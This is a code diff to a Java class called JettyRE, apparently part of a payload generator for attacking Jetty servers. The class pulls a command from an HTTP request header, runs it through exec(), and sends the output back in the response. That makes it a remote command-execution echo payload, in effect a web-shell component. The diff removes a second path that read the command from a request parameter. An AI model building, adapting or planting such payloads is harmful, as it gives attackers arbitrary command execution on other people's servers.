@@ -24,10 +24,9 @@ import java.lang.reflect.Method;
  */
 @Middleware(Middleware.Jetty)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
+@JavaClassModifiable({JavaClassModifiable.HEADER})
 public class JettyRE {
     private static String HEADER;
-    private static String PARAM;
 
     public JettyRE() {
         try {
@@ -60,14 +59,7 @@ public class JettyRE {
                     continue;
 
                 Object header = invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-                Object param = invokeMethod(request.getClass(), request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
-                String str = null;
-                if (header != null) {
-                    str = (String) header;
-                } else if (param != null) {
-                    str = (String) param;
-                }
-                String result = exec(str);
+                String result = exec((String) header);
                 invokeMethod(response.getClass(), response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
                 Object writer = invokeMethod(response.getClass(), response, "getWriter", new Class[]{}, new Object[]{});
                 try {
